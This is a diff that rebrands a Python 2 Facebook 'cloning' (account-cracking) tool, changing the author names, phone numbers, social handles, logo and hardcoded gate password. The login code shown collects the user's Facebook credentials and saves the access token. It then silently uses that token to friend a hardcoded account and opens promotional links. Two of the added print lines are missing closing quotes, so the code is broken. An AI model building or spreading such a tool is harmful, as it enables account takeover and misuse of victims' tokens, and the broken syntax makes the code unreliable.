@@ -48,16 +48,17 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[0;39m╭━━━┳━━━┳━━━╮
-\033[0;39m┃╭━╮┃╭━━┫╭━╮┃
-\033[0;39m╰╯╭╯┃╰━━┫┃┃┃┃
-\033[0;39m╭╮╰╮┃╭━╮┃┃┃┃┃
-\033[0;39m┃╰━╯┃╰━╯┃╰━╯┃
-\033[0;39m╰━━━┻━━━┻━━━╯
+
+\033[0;32m███████╗██╗██████╗░███████╗
+\033[0;33m██╔════╝██║██╔══██╗██╔════╝
+\033[0;34m█████╗░░██║██████╔╝█████╗░░
+\033[0;35m██╔══╝░░██║██╔══██╗██╔══╝░░
+\033[0;36m██║░░░░░██║██║░░██║███████╗
+\033[0;37m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|RANA.AAHIL\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/Aahilzada\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m0308-7861-7861\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mbadshah•|Madeye Modee\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/MadEyeModee\033[0m \033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m0316-7149-753\033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
@@ -77,13 +78,13 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 085691015635\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTOOLS BY AAHIL\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : AAHIL CREATIONSs\x1b[0;31m"""
+print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 03167149753\x1b[1;96m  
+\033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : SarfrazTheTricker\x1b[1;96m  
+\033[1;93m [¤] \x1b[0;31mTOOLS BY Badshah\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : MadEye Modee\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "MadEye"
+CorrectPassword = "Modee"
 
 loop = 'true'
 while (loop == 'true'):
@@ -95,10 +96,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://wa.me/6285691015635')
+            os.system('xdg-open https://www.youtube.com/channel/UCj1kHrVZkqRuy_GzTpSo92g')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://wa.me/6285691015635')
+        os.system('xdg-open https://www.youtube.com/channel/UCj1kHrVZkqRuy_GzTpSo92g')
 
 def login():
 	os.system('clear')
@@ -110,8 +111,8 @@ def login():
 		print logo
 		print 42*"\033[1;96m="
 		print('\033[1;96m[☆] \x1b[1;91mAPNA FACEBOOK ACCOUNT LOGIN KREIN \x1b[1;96m[☆]' )
-		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
+		id = raw_input('\033[1;96m[+] \x1b[0;37mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[+] \x1b[0;39mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -139,7 +140,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UCj1kHrVZkqRuy_GzTpSo92g')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -191,8 +192,8 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Aahil"																														
+	print "\033[1;32;40m[1] \033[1;33;40m══Start Cloning
+	print "\033[1;32;40m[2] \033[1;33;40m══Update Fire																											
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -299,7 +300,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
 
-	jalan('                    \033[1;91mAahil start cloning Wait...')
+	jalan('                    \033[1;91mFire start cloning pleas wait ...')
 	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
 
 	def main(arg):
